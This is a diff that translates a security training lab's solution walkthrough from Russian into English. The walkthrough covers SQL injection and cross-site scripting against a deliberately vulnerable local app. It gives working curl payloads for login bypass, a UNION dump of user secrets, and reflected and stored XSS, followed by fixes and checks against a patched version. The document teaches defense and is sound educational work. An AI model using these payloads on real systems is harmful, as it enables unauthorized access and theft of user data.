@@ -1,20 +1,20 @@
-🌐 **Русский** · [Oʻzbekcha](./SOLUTION.uz.md)
+🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)
 
-# A05 — Решение (спойлеры!)
+# A05 — Solution (spoilers!)
 
-Сначала попробуйте пройти лабу сами, используя подсказки из [README](./README.md).
+Try the lab yourself first, using the hints from the [README](./README.md).
 
-Все запросы ниже относятся к vulnerable (порт 8041).
+All requests below are against vulnerable (port 8041).
 
-## 1. Обход входа
+## 1. Login bypass
 
-Запрос в приложении собирается так:
+The query in the application is built like this:
 
 ```sql
-SELECT username, role, secret FROM users WHERE username = '<логин>' AND password = '<пароль>'
+SELECT username, role, secret FROM users WHERE username = '<login>' AND password = '<password>'
 ```
 
-Если в логин подставить `admin'--`, то всё после `--` становится комментарием, и проверка пароля исчезает:
+If you put `admin'--` into the login, everything after `--` becomes a comment, and the password check disappears:
 
 ```sql
 ... WHERE username = 'admin'--' AND password = 'x'
@@ -23,12 +23,12 @@ SELECT username, role, secret FROM users WHERE username = '<логин>' AND pas
 ```bash
 curl -H 'Content-Type: application/json' \
   -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
-# → вход админом и FLAG{a05_sqli_login_bypass}
+# → logged in as admin and FLAG{a05_sqli_login_bypass}
 ```
 
-Другой вариант: логин `nobody' OR '1'='1' --`, условие становится всегда истинным, и вход выполняется под первым пользователем таблицы.
+Another option: the login `nobody' OR '1'='1' --`, the condition becomes always true, and you are logged in as the first user in the table.
 
-## 2. Скрытый товар
+## 2. The hidden product
 
 ```sql
 SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
@@ -36,63 +36,63 @@ SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
 
 ```bash
 curl -G http://127.0.0.1:8041/products --data-urlencode "q=%' OR 1=1 --"
-# в ответе появляется скрытый товар с FLAG{a05_hidden_product}
+# the hidden product with FLAG{a05_hidden_product} appears in the response
 ```
 
-`OR 1=1` делает условие истинным, а `--` отбрасывает `AND hidden = 0`.
+`OR 1=1` makes the condition true, and `--` throws away `AND hidden = 0`.
 
-## 3. UNION: данные из другой таблицы
+## 3. UNION: data from another table
 
-Исходный запрос возвращает три столбца (`id`, `name`, `price`), поэтому и в `UNION SELECT` их должно быть три:
+The original query returns three columns (`id`, `name`, `price`), so `UNION SELECT` must have three too:
 
 ```bash
 curl -G http://127.0.0.1:8041/products \
   --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"
-# в поле name: admin, а в поле price: FLAG{a05_sqli_union_dump}
+# the name field holds admin, and the price field holds FLAG{a05_sqli_union_dump}
 ```
 
-Попробуйте `q='` без продолжения: приложение вернёт текст ошибки SQL. Такие ошибки помогают атакующему понять структуру запроса, поэтому показывать их пользователю нельзя.
+Try `q='` with nothing after it: the application returns the SQL error text. Such errors help an attacker understand the structure of the query, so they must not be shown to the user.
 
 ## 4. XSS
 
-**Отражённый.** Скрипт приходит в параметре и сразу попадает в страницу. Откройте в браузере:
+**Reflected.** The script arrives in a parameter and goes straight into the page. Open in a browser:
 
 ```
 http://127.0.0.1:8041/search?q=<script>alert(1)</script>
 ```
 
-**Хранимый.** Скрипт сохраняется на сервере и выполняется у каждого, кто откроет страницу:
+**Stored.** The script is saved on the server and runs for everyone who opens the page:
 
 ```bash
 curl -H 'Content-Type: application/json' \
   -d '{"name":"x","message":"<script>alert(1)</script>"}' http://127.0.0.1:8041/guestbook
 ```
 
-Затем откройте http://127.0.0.1:8041/guestbook в браузере. В реальной системе вместо `alert(1)` мог бы быть код, крадущий данные пользователя, поэтому XSS опасен.
+Then open http://127.0.0.1:8041/guestbook in a browser. In a real system, instead of `alert(1)` there could be code that steals the user's data, which is why XSS is dangerous.
 
-Гостевая книга хранится в памяти приложения и очищается при перезапуске.
+The guestbook is kept in the application's memory and is cleared on restart.
 
-## Исправления (fixed, порт 8042)
+## Fixes (fixed, port 8042)
 
-| Проблема | Исправление |
-|----------|-------------|
-| Склейка строк в SQL (вход, поиск) | Параметризованные запросы: `... WHERE username = ?`, `... LIKE ?` |
-| Вывод без экранирования (поиск, гостевая) | `markupsafe.escape` при выводе: `<` превращается в `&lt;` |
-| Нет защиты в глубину | Заголовок `Content-Security-Policy: default-src 'none'` запрещает выполнение скриптов, ограничена длина полей |
-| Сравнение пароля внутри SQL | Пароль сравнивается в коде через `hmac.compare_digest` |
-| Текст ошибки БД в ответе | Ошибка SQL больше не возникает, а запросы не зависят от ввода |
+| Problem | Fix |
+|---------|-----|
+| String concatenation in SQL (login, search) | Parameterized queries: `... WHERE username = ?`, `... LIKE ?` |
+| Output without escaping (search, guestbook) | `markupsafe.escape` on output: `<` becomes `&lt;` |
+| No defense in depth | The header `Content-Security-Policy: default-src 'none'` forbids running scripts, field lengths are limited |
+| Password compared inside SQL | The password is compared in code with `hmac.compare_digest` |
+| Database error text in the response | The SQL error no longer occurs, and the queries do not depend on the input |
 
-Проверка на fixed (порт 8042):
+Check on fixed (port 8042):
 
 ```bash
 curl -H 'Content-Type: application/json' \
   -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login         # 401
 curl -G http://127.0.0.1:8042/products --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"   # []
-curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # в ответе &lt;script&gt;...
+curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # the response contains &lt;script&gt;...
 ```
 
-## Что ещё стоит помнить
-- Экранирование зависит от контекста (HTML, атрибут, JavaScript, URL), поэтому лучше использовать шаблонизатор с автоэкранированием.
-- Параметризация защищает значения, но не имена таблиц и столбцов: их нельзя подставлять из ввода, только из белого списка.
-- Инъекции бывают не только в SQL и HTML: команды ОС, LDAP, NoSQL-запросы. Принцип везде один: данные нельзя смешивать с кодом.
-- Пароли в этой лабе хранятся открытым текстом только ради простоты. О хранении паролей см. лабу A04.
+## What else to remember
+- Escaping depends on the context (HTML, attribute, JavaScript, URL), so it is better to use a template engine with auto-escaping.
+- Parameterization protects values, but not table and column names: they must not be taken from input, only from an allow list.
+- Injections are not limited to SQL and HTML: OS commands, LDAP, NoSQL queries. The principle is the same everywhere: data must not be mixed with code.
+- Passwords in this lab are stored in plain text only for simplicity. For password storage see lab A04.
